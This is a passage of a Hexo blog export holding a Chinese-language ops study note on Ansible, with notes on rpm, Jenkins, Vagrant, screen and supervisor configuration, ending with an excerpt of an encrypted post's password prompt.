    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>链接收集</category>
      </categories>
      <tags>
        <tag>链接</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Ansible-升级打怪之路</title>
    <url>/Ansible-%E5%8D%87%E7%BA%A7%E6%89%93%E6%80%AA%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="Ansible-安装"><a href="#Ansible-安装" class="headerlink" title="Ansible 安装"></a>Ansible 安装</h2><p><strong>Ubuntu (Apt)</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装 add-apt-repository 必要套件。</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install -y python-software-properties software-properties-common</span><br><span class="line">使用 Ansible 官方的 PPA 套件来源。</span><br><span class="line"></span><br><span class="line">$ sudo add-apt-repository -y ppa:ansible/ansible; sudo apt-get update</span><br><span class="line">安装 Ansible。</span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line">$ sudo apt-get install -y ansible</span><br></pre></td></tr></table></figure></p>
<p><strong>CentOS (Yum)</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">新增 epel-release 第三方套件来源。</span><br><span class="line"></span><br><span class="line">$ sudo yum install -y epel-release</span><br><span class="line">安装 Ansible。</span><br><span class="line"></span><br><span class="line">$ sudo yum install -y ansible</span><br></pre></td></tr></table></figure></p>
<h2 id="Ansible-是个啥？"><a href="#Ansible-是个啥？" class="headerlink" title="Ansible 是个啥？"></a>Ansible 是个啥？</h2><p><a href="https://www.w3cschool.cn/automate_with_ansible/automate_with_ansible-5l6c27p8.html" target="_blank" rel="noopener"></a></p>
<p>Ansible是一种自动化运维工具,基于paramiko开发的,并且基于模块化工作，Ansible 是一种集成 IT 系统的配置管理、应用部署、执行特定任务的开源平台，它是基于python语言，由Paramiko 和PyYAML 两个关键模块构建。集合了众多运维工具的优点，实现了批量系统配置、批量程序部署、批量运行命令等功能.ansible 是基于模块工作的,本身没有批量部署的能力.真正具有批量部署的是ansible所运行的模块，ansible 只是提供一种框架.ansible 不需要在远程主机上安装 client/agents，因为它们是基于 ssh 来和远程主机通讯的.</p>
<ul>
<li>ansible被定义为配置管理工具,配置管理工具通常具有以下功能:<br>确保所依赖的软件包已经被安装<br>配置文件包含正确的内容和正确的权限<br>相关服务被正确运行</li>
</ul>
<h3 id="Ansible基本架构"><a href="#Ansible基本架构" class="headerlink" title="Ansible基本架构"></a>Ansible基本架构</h3><p>ansible系统由控制主机和被管理主机组成,控制主机不支持windows平台</p>
<p>核心: ansible<br>Core Modules: ansible自带的模块<br>Custom Modules: 核心模块功能不足时,用户可以添加扩展模块<br>Plugins: 通过插件来实现记录日志,发送邮件或其他功能<br>Playbooks: 剧本,YAML 格式文件，多个任务定义在一个文件中，定义主机需要调用哪些模块来完成的功能<br>Connectior Plugins: ansible基于连接插件连接到各个主机上,默认是使用ssh<br>Host Inventory: 记录由Ansible管理的主机信息，包括端口、密码、ip等</p>
<h3 id="Ansible特点"><a href="#Ansible特点" class="headerlink" title="Ansible特点"></a>Ansible特点</h3><p>部署简单, 只需要在控制主机上部署ansible环境,被控制端上只要求安装ssh和python 2.5以上版本,这个对于类unix系统来说相当与无需配置.</p>
<p>no angents: 被管控节点无需安装 agent<br>no server: 无服务端,使用是直接调用命名<br>modules in any languages: 基于模块工作, 可以使用任意语言开发模块<br>易读的语法: 基于 yaml 语法编写 playbook<br>基于推送模式: 不同于 puppet 的拉取模式,直接由调用者控制变更在服务器上发生的时间<br>模块是幂等性的:定义的任务已存在则不会做任何事情,意味着在同一台服务器上多次执行同一个playbook 是安全的。</p>
<h3 id="YAML"><a href="#YAML" class="headerlink" title="YAML"></a>YAML</h3><p>是一个可读性高，用来表达数据序列化的格式。<br>它是JSON的严格超集，增加了语法显著换行符和缩进，就像Python。但和Python不一样， YAML根本不容许文字制表符。</p>
<p><a href="http://www.ruanyifeng.com/blog/2016/07/yaml.html" target="_blank" rel="noopener"> 阮一峰 YAML 语言教程</a><br><a href="https://www.w3cschool.cn/iqmrhf/dotvpozt.html" target="_blank" rel="noopener">参考资料</a><br><a href="https://blog.csdn.net/StoneEpigraph/article/details/85088262" target="_blank" rel="noopener">YAML入门</a></p>
<h3 id="Playbook"><a href="#Playbook" class="headerlink" title="Playbook"></a>Playbook</h3><p>playbooks是 一个不同于使用Ansible命令行执行方式的模式，其功能更强大灵活。简单来说，playbook是一个非常简单的配置管理和多主机部署系统，不同于任何已经存在的模式，可作为一个适合部署复杂应用程序的基础。Playbook可以定制配置，可以按照指定的操作步骤有序执行，支持同步和异步方式。值得注意的是playbook是通过YAML格式来进行描述定义的。</p>
<h3 id="puppet"><a href="#puppet" class="headerlink" title="puppet"></a>puppet</h3><p>puppet是一个IT基础设施自动化管理工具，它能够帮助系统管理员管理基础设施的整个生命周期： 供应(provisioning)、配置(configuration)、联动(orchestration)及报告(reporting)。<br>基于puppet ，可实现自动化重复任务、快速部署关键性应用以及在本地或云端完成主动管理变更和快速扩展架构规模等。</p>
<p><a href="https://www.cnblogs.com/keerya/p/8040071.html" target="_blank" rel="noopener">自动化运维工具——puppet详解（一）</a></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>略。。。。。。。</p>
<hr>
<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>第一次连接 ansible 的 host 里的一堆机器时，会出 Using a SSH password instead of a key 里面的错，解决办法如下：<br>host_key_checking = False 注释掉<br><a href="http://www.361way.com/ansible-cfg/4401.html" target="_blank" rel="noopener">参考</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblogs.com/keerya/p/7987886.html" target="_blank" rel="noopener">blog_1</a><br><a href="https://www.cnblogs.com/keerya/p/8004566.html" target="_blank" rel="noopener">blog_2</a></p>
<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><h3 id="10-月-23-25-号"><a href="#10-月-23-25-号" class="headerlink" title="10 月 23 - 25 号"></a>10 月 23 - 25 号</h3><h4 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h4><p>1、完成四个基础 yml<br>2、了解异常处理，并运用<br>3、了解变量，传参数，并运用<br>4、基本有一个模糊的框架意识</p>
<h4 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h4><p>rmp 包的管理<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装rpm包</span><br><span class="line">基本语法： rpm -ivh  RPM包全路径名称</span><br><span class="line">参数说明： i=install 安装 v=verbose 提示 h=hash  进度条</span><br><span class="line"></span><br><span class="line">查看rpm安装包列表：</span><br><span class="line">rpm -qa|grep mysql</span><br><span class="line">正常卸载：</span><br><span class="line">rpm -e mysql-community-client-5.6.44-2.el7.x86_64</span><br><span class="line">强制卸载：</span><br><span class="line">rpm -e mysql-community-client-5.6.44-2.el7.x86_64 --nodeps</span><br><span class="line"></span><br><span class="line">rpm 包的其它查询指令：</span><br><span class="line">rpm -qa:查询所安装的所有rpm软件包</span><br><span class="line">rpm -qa | more ：查询所安装的所有rpm软件包 并且分页显示</span><br><span class="line">rpm -qa | grep X [rpm -qa | grep firefox ] ：查询是否安装有某个软件（火狐的软件）</span><br><span class="line">rpm -q  软件包名 ：查询软件包是否安装 rpm -q firefox</span><br><span class="line">rpm -qi 软件包名 ：查询软件包信息</span><br><span class="line">rpm -ql 软件包名 ：查询软件包中的文件的安装位置</span><br><span class="line">rpm -qf 文件全路径名：查询文件所属的软件包 ，例如：rpm -qf /etc/passwd </span><br><span class="line"></span><br><span class="line">安装时遇到依赖缺失:</span><br><span class="line">自动安装依赖：</span><br><span class="line">yum localinstall percona-xtrabackup-24-2.4.14-1.el6.x86_64.rpm -y</span><br><span class="line"></span><br><span class="line">内网环境，不能自由地使用yum怎么办？</span><br><span class="line">建议方法:</span><br><span class="line">找一台可以yum的服务器</span><br><span class="line">修改yum配置文件，使yum安装后保留rpm包</span><br><span class="line"></span><br><span class="line">vi /etc/yum.conf</span><br><span class="line">[main]</span><br><span class="line">cachedir=/var/cache/yum</span><br><span class="line">keepcache=1</span><br><span class="line"></span><br><span class="line">#将 keepcache=0 修改为 keepcache=1</span><br><span class="line">#保留的 rpm 安装包在 /var/cache/yum</span><br><span class="line">默认 rpm 包保留在 /var/cache/yum 下，找出来并拷贝到需要安装的服务器上。</span><br><span class="line">用以下命令安装</span><br><span class="line"># 因为部分 rpm 包互相依赖，只能用此方法安装。</span><br><span class="line"></span><br><span class="line">rpm -ivh *.rpm --nodeps --force</span><br></pre></td></tr></table></figure></p>
<h4 id="记录-1"><a href="#记录-1" class="headerlink" title="记录"></a>记录</h4><h5 id="Ansible"><a href="#Ansible" class="headerlink" title="Ansible"></a>Ansible</h5><h6 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h6><p><a href="http://www.zsythink.net/archives/category/%e8%bf%90%e7%bb%b4%e7%9b%b8%e5%85%b3/ansible/" target="_blank" rel="noopener">朱双印</a></p>
<p><a href="https://www.w3cschool.cn/automate_with_ansible/" target="_blank" rel="noopener">W3</a></p>
<p><a href="https://www.503error.com/category/translate/ansible" target="_blank" rel="noopener">张志明</a></p>
<h6 id="ansible-doc-authorized-key"><a href="#ansible-doc-authorized-key" class="headerlink" title="ansible-doc authorized_key"></a>ansible-doc authorized_key</h6><p>添加或移除authorized keys为特定用户<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Options: (= is mandatory)(= 后面的参数是强制要有的)</span><br><span class="line">- exclusive [default: no]</span><br><span class="line">　　是否移除authorized_keys文件中其它非指定key</span><br><span class="line">= key</span><br><span class="line">　　The SSH public key(s) 可以是字符串或url (https://github.com/username.keys)</span><br><span class="line">- key_options</span><br><span class="line">　　附加到key中的字符串 #不加参数会删除上次带参数时添加的字符串</span><br><span class="line">- path</span><br><span class="line">　　authorized_keys文件存放的位置 [Default: (homedir)+/.ssh/authorized_keys]</span><br><span class="line">- state</span><br><span class="line">　　present 添加指定key到authorized_keys文件中</span><br><span class="line">　　absent 从authorized_keys文件中移除指定key [Default: present]</span><br><span class="line">- user</span><br><span class="line">　　远端服务器上的用户(编辑该用户的authorized_keys文件) [Default: None]</span><br></pre></td></tr></table></figure></p>
<p><img data-src="https://img-blog.csdnimg.cn/20181031102550992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI1OTM0NDAx,size_16,color_FFFFFF,t_70" alt></p>
<h6 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h6><p>1、error 不中断继续执行</p>
<p>ignore_errors</p>
<p>2、自定义异常处理</p>
<h6 id="迭代-with-iteams"><a href="#迭代-with-iteams" class="headerlink" title="迭代 with_iteams"></a>迭代 with_iteams</h6><p>看复盘整理</p>
<h6 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h6><p>看复盘整理</p>
<h5 id="CI-CD"><a href="#CI-CD" class="headerlink" title="CI/CD"></a>CI/CD</h5><p>CI全名Continuous Integration，啥意思？就是我们经常听到的持续集成概念。<br>当开发每天会提交多次代码到主干上，会做一些重复性的动作时，就可以用持续集成环境来操作。<br>有集成了，就肯定少不了它的好基友，没错就是CD。<br>CD全名是Continuous Deployment，是持续部署。<br>CD还有个小号，交持续交付，英文全称是Continuous delivery，缩写也是CD。</p>
<p>CI/CD优点是，重复的工作用自动化来代替、减少时间成本、版本发布时间减短了。</p>
<p><a href="https://blog.csdn.net/duanlei123456/article/details/87454053" target="_blank" rel="noopener">CSDN</a></p>
<h5 id="jenkins"><a href="#jenkins" class="headerlink" title="jenkins"></a>jenkins</h5><h6 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h6><p><a href="https://blog.csdn.net/wzh1070/article/details/80853277" target="_blank" rel="noopener">CSDN入门级</a></p>
<p>运行：<br>java -jar jenkins.war –httpPort=18501<br>nohup java -jar jenkins.war –httpPort=8080 &amp;</p>
<h5 id="Vagrant"><a href="#Vagrant" class="headerlink" title="Vagrant"></a>Vagrant</h5><p>Vagrant是一个基于Ruby的工具，用于创建和部署虚拟化开发环境。它 使用Oracle的开源VirtualBox虚拟化系统，使用 Chef创建自动化虚拟环境。</p>
<p>参考资料：</p>
<p><a href="https://www.cnblogs.com/hafiz/p/9175484.html#autoid-2-0-0" target="_blank" rel="noopener">征服诱人的Vagrant！</a><br><a href="https://blog.csdn.net/hongweiit/article/details/81148357#2" target="_blank" rel="noopener">使用Vagrant管理虚拟机</a><br><a href="https://blog.csdn.net/u011781521/article/details/80275212" target="_blank" rel="noopener">Vagrant系列(一)—-win10搭建Vagrant+VirtualBox环境</a><br><a href="https://blog.csdn.net/u011781521/article/details/80291765" target="_blank" rel="noopener">Vagrant系列(二)—-Vagrant的配置文件Vagrantfile详解</a></p>
<p>vagrant box基本命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">列出本地环境中所有的box</span><br><span class="line">vagrant box list</span><br><span class="line"></span><br><span class="line">添加box到本地vagrant环境</span><br><span class="line">vagrant box add box-name(box-url)</span><br><span class="line"></span><br><span class="line">更新本地环境中指定的box</span><br><span class="line">vagrant box update box-name</span><br><span class="line"></span><br><span class="line">删除本地环境中指定的box</span><br><span class="line">vagrant box remove box-name</span><br><span class="line"></span><br><span class="line">重新打包本地环境中指定的box</span><br><span class="line">vagrant box repackage box-name</span><br><span class="line"></span><br><span class="line">在空文件夹初始化虚拟机</span><br><span class="line">vagrant init [box-name]</span><br><span class="line"></span><br><span class="line">在初始化完的文件夹内启动虚拟机</span><br><span class="line">vagrant up</span><br><span class="line"></span><br><span class="line">ssh登录启动的虚拟机</span><br><span class="line">vagrant ssh</span><br><span class="line"></span><br><span class="line">挂起启动的虚拟机</span><br><span class="line">vagrant suspend</span><br><span class="line"></span><br><span class="line">重启虚拟机</span><br><span class="line">vagrant reload</span><br><span class="line"></span><br><span class="line">关闭虚拟机</span><br><span class="line">vagrant halt</span><br><span class="line"></span><br><span class="line">查找虚拟机的运行状态</span><br><span class="line">vagrant status</span><br><span class="line"></span><br><span class="line">销毁当前虚拟机</span><br><span class="line">vagrant destroy</span><br></pre></td></tr></table></figure></p>
<h5 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h5><p><a href="https://blog.csdn.net/qq_41673534/article/details/80252016" target="_blank" rel="noopener">NF、NR、FNR、FS、OFS、RS、ORS</a></p>
<h5 id="nohup后台运行"><a href="#nohup后台运行" class="headerlink" title="nohup后台运行"></a>nohup后台运行</h5><p><a href="https://blog.csdn.net/zdyueguanyun/article/details/80240355" target="_blank" rel="noopener">jar文件包程序在linux下利用nohup后台运行</a></p>
<p>注意错误：&amp; 缺失情况</p>
<h5 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">选项</span><br><span class="line">-A 　将所有的视窗都调整为目前终端机的大小。</span><br><span class="line">-d &lt;作业名称&gt; 　将指定的screen作业离线。</span><br><span class="line">-h &lt;行数&gt; 　指定视窗的缓冲区行数。</span><br><span class="line">-m 　即使目前已在作业中的screen作业，仍强制建立新的screen作业。</span><br><span class="line">-r &lt;作业名称&gt; 　恢复离线的screen作业。</span><br><span class="line">-R 　先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。</span><br><span class="line">-s 　指定建立新视窗时，所要执行的shell。</span><br><span class="line">-S &lt;作业名称&gt; 　指定screen作业的名称。</span><br><span class="line">-v 　显示版本信息。</span><br><span class="line">-x 　恢复之前离线的screen作业。</span><br><span class="line">-ls或--list 　显示目前所有的screen作业。</span><br><span class="line">-wipe 　检查目前所有的screen作业，并删除已经无法使用的screen作业。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常用screen参数</span><br><span class="line">screen -S yourname -&gt; 新建一个叫yourname的session</span><br><span class="line">screen -ls -&gt; 列出当前所有的session</span><br><span class="line">screen -r yourname -&gt; 回到yourname这个session</span><br><span class="line">screen -x yourname -&gt; 回到yourname这个session</span><br><span class="line">screen -d yourname -&gt; 远程detach某个session</span><br><span class="line">screen -d -r yourname -&gt; 结束当前session并回到yourname这个session</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始。</span><br><span class="line"></span><br><span class="line">C-a ? -&gt; 显示所有键绑定信息</span><br><span class="line">C-a c -&gt; 创建一个新的运行shell的窗口并切换到该窗口</span><br><span class="line">C-a n -&gt; Next，切换到下一个 window </span><br><span class="line">C-a p -&gt; Previous，切换到前一个 window </span><br><span class="line">C-a 0..9 -&gt; 切换到第 0..9 个 window</span><br><span class="line">Ctrl+a [Space] -&gt; 由视窗0循序切换到视窗9</span><br><span class="line">C-a C-a -&gt; 在两个最近使用的 window 间切换 </span><br><span class="line">C-a x -&gt; 锁住当前的 window，需用用户密码解锁</span><br><span class="line">C-a d -&gt; detach，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。 </span><br><span class="line">C-a z -&gt; 把当前session放到后台执行，用 shell 的 fg 命令则可回去。</span><br><span class="line">C-a w -&gt; 显示所有窗口列表</span><br><span class="line">C-a t -&gt; time，显示当前时间，和系统的 load </span><br><span class="line">C-a k -&gt; kill window，强行关闭当前的 window</span><br><span class="line">C-a  -&gt; 进入 copy mode，在 copy mode 下可以回滚、搜索、复制就像用使用 [vi 一样</span><br><span class="line">    C-b Backward，PageUp </span><br><span class="line">    C-f Forward，PageDown </span><br><span class="line">    H(大写) High，将光标移至左上角 </span><br><span class="line">    L Low，将光标移至左下角 </span><br><span class="line">    0 移到行首 </span><br><span class="line">    $ 行末 </span><br><span class="line">    w forward one word，以字为单位往前移 </span><br><span class="line">    b backward one word，以字为单位往后移 </span><br><span class="line">    Space 第一次按为标记区起点，第二次按为终点 </span><br><span class="line">    Esc 结束 copy mode </span><br><span class="line">C-a ] -&gt; paste，把刚刚在 copy mode 选定的内容贴上</span><br></pre></td></tr></table></figure>
<h5 id="supervisor"><a href="#supervisor" class="headerlink" title="supervisor"></a>supervisor</h5><p><a href="http://supervisord.org/" target="_blank" rel="noopener">官网</a><br><a href="https://blog.csdn.net/xyang81/article/details/51555473" target="_blank" rel="noopener">参考资料：CSDN</a><br><a href="https://segmentfault.com/a/1190000017370468" target="_blank" rel="noopener"></a><br><a href="http://liyangliang.me/posts/2015/06/using-supervisor/" target="_blank" rel="noopener">参考资料：个人博客</a><br><a href="https://www.cnblogs.com/ants/p/5732337.html#_label6" target="_blank" rel="noopener">参考资料：搭建实例</a><br><a href="https://www.linuxidc.com/Linux/2015-04/116701.htm" target="_blank" rel="noopener">详细命令说明</a><br><a href="https://www.jianshu.com/p/805977544d7f" target="_blank" rel="noopener">集群规模扩大后的相关思考</a></p>
<p>supervisord<br>配置后台服务/常驻进程的进程管家工具</p>
<p>Supervisor只能管理非daemon的进程，也就是说Supervisor不能管理守护进程。否则提示Exited too quickly (process log may have details)异常。例子中的Tomcat默认是以守护进程启动的，所以我们改成了catalina.sh run，以前台进程的方式运行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装</span><br><span class="line"># 安装 supervisord</span><br><span class="line">apt-get install supervisor</span><br><span class="line">yun install supervisor -y</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line">yum install python-setuptools</span><br><span class="line">easy_install supervisor</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line">#如果easy_install不好使就从官方下载：</span><br><span class="line">wget https://pypi.python.org/packages/80/37/964c0d53cbd328796b1aeb7abea4c0f7b0e8c7197ea9b0b9967b7d004def/supervisor-3.3.1.tar.gz</span><br><span class="line">#然后通过python安装：</span><br><span class="line">tar zxf supervisor-3.3.1.tar.gz</span><br><span class="line">cd supervisor</span><br><span class="line">python setup.py install</span><br><span class="line"></span><br><span class="line">supervisor安装完成后会生成三个执行程序：</span><br><span class="line">supervisortd、supervisorctl、echo_supervisord_conf，</span><br><span class="line">分别是supervisor的</span><br><span class="line">守护进程服务（用于接收进程管理命令）、客户端（用于和守护进程通信，发送管理进程的指令）、生成初始配置文件程序。</span><br><span class="line"></span><br><span class="line">下载地址</span><br><span class="line">https://pypi.python.org/pypi/meld3</span><br><span class="line">https://pypi.python.org/pypi/supervisor</span><br></pre></td></tr></table></figure>
<p>配置Supervisor<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a.创建文件夹和配置文件</span><br><span class="line"></span><br><span class="line">mkdir /etc/supervisor</span><br><span class="line">echo_supervisord_conf &gt; /etc/supervisor/supervisord.conf</span><br><span class="line"></span><br><span class="line">b.修改/etc/supervisor/supervisord.conf文件内容</span><br><span class="line">在文件结尾[include]节点处</span><br><span class="line">把</span><br><span class="line">;files = relative/directory/*.ini</span><br><span class="line">改为</span><br><span class="line">files = conf.d/*.conf</span><br><span class="line"></span><br><span class="line">c.若supervisor已经启动，需要执行supervisorctl reload命令使配置文件生效。</span><br><span class="line"></span><br><span class="line">d.在/etc/supervisor/下创建conf.d文件夹，及ProjectName.conf(以项目名称命名的)</span><br><span class="line"></span><br><span class="line">e.打开laravel.conf文件，添加内容如下：</span><br><span class="line"></span><br><span class="line">模板一：</span><br><span class="line">[program:MGToastServer] ;程序名称，终端控制时需要的标识</span><br><span class="line">command=dotnet MGToastServer.dll ; 运行程序的命令</span><br><span class="line">directory=/root/文档/toastServer/ ; 命令执行的目录</span><br><span class="line">autorestart=true ; 程序意外退出是否自动重启</span><br><span class="line">stderr_logfile=/var/log/MGToastServer.err.log ; 错误日志文件,文件夹和文件要存在不然报错，不懂先注释掉。</span><br><span class="line">stdout_logfile=/var/log/MGToastServer.out.log ; 输出日志文件，同上</span><br><span class="line">environment=ASPNETCORE_ENVIRONMENT=Production ; 进程环境变量</span><br><span class="line">user=root ; 进程执行的用户身份</span><br><span class="line">stopsignal=INT</span><br><span class="line"></span><br><span class="line">模板二：</span><br><span class="line">[program:usercenter]</span><br><span class="line">directory = /home/leon/projects/usercenter ; 程序的启动目录</span><br><span class="line">command = gunicorn -w 8 -b 0.0.0.0:17510 wsgi:app  ; 启动命令</span><br><span class="line">autostart = true     ; 在 supervisord 启动的时候也自动启动</span><br><span class="line">startsecs = 5        ; 启动 5 秒后没有异常退出，就当作已经正常启动了</span><br><span class="line">autorestart = true   ; 程序异常退出后自动重启</span><br><span class="line">startretries = 3     ; 启动失败自动重试次数，默认是 3</span><br><span class="line">user = leon          ; 用哪个用户启动</span><br><span class="line">redirect_stderr = true  ; 把 stderr 重定向到 stdout，默认 false</span><br><span class="line">stdout_logfile_maxbytes = 20MB  ; stdout 日志文件大小，默认 50MB</span><br><span class="line">stdout_logfile_backups = 20     ; stdout 日志文件备份数</span><br><span class="line">; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件）</span><br><span class="line">stdout_logfile = /data/logs/usercenter_stdout.log</span><br><span class="line"></span><br><span class="line">Ps:其中 [program:usercenter] 中的 usercenter 是应用程序的唯一标识，不能重复。对该程序的所有操作（start, restart 等）都通过名字来实现。</span><br><span class="line"></span><br><span class="line">f.运行</span><br><span class="line">supervisord -c /etc/supervisor/supervisord.conf</span><br><span class="line"></span><br><span class="line">ps:如果服务已启动，修改配置文件可用“supervisorctl reload”命令来使其生效</span><br><span class="line"></span><br><span class="line">g.查看进程 (ps -ef | grep ProjectName)</span><br><span class="line">ps -ef|grep laravel</span><br></pre></td></tr></table></figure></p>
<p>使用 supervisorctl</p>
<p>Supervisorctl 是 supervisord 的一个命令行客户端工具，启动时需要指定与 supervisord 使用同一份配置文件，否则与 supervisord 一样按照顺序查找配置文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">supervisorctl -c /etc/supervisord.conf</span><br><span class="line"></span><br><span class="line">上面这个命令会进入 supervisorctl 的 shell 界面，然后可以执行不同的命令了：</span><br><span class="line"></span><br><span class="line">&gt; status    # 查看程序状态</span><br><span class="line">&gt; stop usercenter   # 关闭 usercenter 程序</span><br><span class="line">&gt; start usercenter  # 启动 usercenter 程序</span><br><span class="line">&gt; restart usercenter    # 重启 usercenter 程序</span><br><span class="line">&gt; reread    ＃ 读取有更新（增加）的配置文件，不会启动新添加的程序</span><br><span class="line">&gt; update    ＃ 重启配置文件修改过的程序</span><br><span class="line">上面这些命令都有相应的输出，除了进入 supervisorctl 的 shell 界面，也可以直接在 bash 终端运行：</span><br><span class="line"></span><br><span class="line">supervisorctl restart &lt;application name&gt; ;重启指定应用</span><br><span class="line">supervisorctl stop &lt;application name&gt; ;停止指定应用</span><br><span class="line">supervisorctl start &lt;application name&gt; ;启动指定应用</span><br><span class="line">supervisorctl restart all ;重启所有应用</span><br><span class="line">supervisorctl stop all ;停止所有应用</span><br><span class="line">supervisorctl start all ;启动所有应用</span><br></pre></td></tr></table></figure>
<p>配置文件参数说明<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[unix_http_server]</span><br><span class="line">file=/tmp/supervisor.sock   ;UNIX socket 文件，supervisorctl 会使用</span><br><span class="line">;chmod=0700                 ;socket文件的mode，默认是0700</span><br><span class="line">;chown=nobody:nogroup       ;socket文件的owner，格式：uid:gid</span><br><span class="line"></span><br><span class="line">;[inet_http_server]         ;HTTP服务器，提供web管理界面</span><br><span class="line">;port=127.0.0.1:9001        ;Web管理后台运行的IP和端口，如果开放到公网，需要注意安全性</span><br><span class="line">;username=user              ;登录管理后台的用户名</span><br><span class="line">;password=123               ;登录管理后台的密码</span><br><span class="line"></span><br><span class="line">[supervisord]</span><br><span class="line">logfile=/tmp/supervisord.log ;日志文件，默认是 $CWD/supervisord.log</span><br><span class="line">logfile_maxbytes=50MB        ;日志文件大小，超出会rotate，默认 50MB，如果设成0，表示不限制大小</span><br><span class="line">logfile_backups=10           ;日志文件保留备份数量默认10，设为0表示不备份</span><br><span class="line">loglevel=info                ;日志级别，默认info，其它: debug,warn,trace</span><br><span class="line">pidfile=/tmp/supervisord.pid ;pid 文件</span><br><span class="line">nodaemon=false               ;是否在前台启动，默认是false，即以 daemon 的方式启动</span><br><span class="line">minfds=1024                  ;可以打开的文件描述符的最小值，默认 1024</span><br><span class="line">minprocs=200                 ;可以打开的进程数的最小值，默认 200</span><br><span class="line"></span><br><span class="line">[supervisorctl]</span><br><span class="line">serverurl=unix:///tmp/supervisor.sock ;通过UNIX socket连接supervisord，路径与unix_http_server部分的file一致</span><br><span class="line">;serverurl=http://127.0.0.1:9001 ; 通过HTTP的方式连接supervisord</span><br><span class="line"></span><br><span class="line">; [program:xx]是被管理的进程配置参数，xx是进程的名称</span><br><span class="line">[program:xx]</span><br><span class="line">command=/opt/apache-tomcat-8.0.35/bin/catalina.sh run  ; 程序启动命令</span><br><span class="line">autostart=true       ; 在supervisord启动的时候也自动启动</span><br><span class="line">startsecs=10         ; 启动10秒后没有异常退出，就表示进程正常启动了，默认为1秒</span><br><span class="line">autorestart=true     ; 程序退出后自动重启,可选值：[unexpected,true,false]，默认为unexpected，表示进程意外杀死后才重启</span><br><span class="line">startretries=3       ; 启动失败自动重试次数，默认是3</span><br><span class="line">user=tomcat          ; 用哪个用户启动进程，默认是root</span><br><span class="line">priority=999         ; 进程启动优先级，默认999，值小的优先启动</span><br><span class="line">redirect_stderr=true ; 把stderr重定向到stdout，默认false</span><br><span class="line">stdout_logfile_maxbytes=20MB  ; stdout 日志文件大小，默认50MB</span><br><span class="line">stdout_logfile_backups = 20   ; stdout 日志文件备份数，默认是10</span><br><span class="line">; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件）</span><br><span class="line">stdout_logfile=/opt/apache-tomcat-8.0.35/logs/catalina.out</span><br><span class="line">stopasgroup=false     ;默认为false,进程被杀死时，是否向这个进程组发送stop信号，包括子进程</span><br><span class="line">killasgroup=false     ;默认为false，向进程组发送kill信号，包括子进程</span><br><span class="line"></span><br><span class="line">;包含其它配置文件</span><br><span class="line">[include]</span><br><span class="line">files = relative/directory/*.ini    ;可以指定一个或多个以.ini结束的配置文件</span><br></pre></td></tr></table></figure></p>
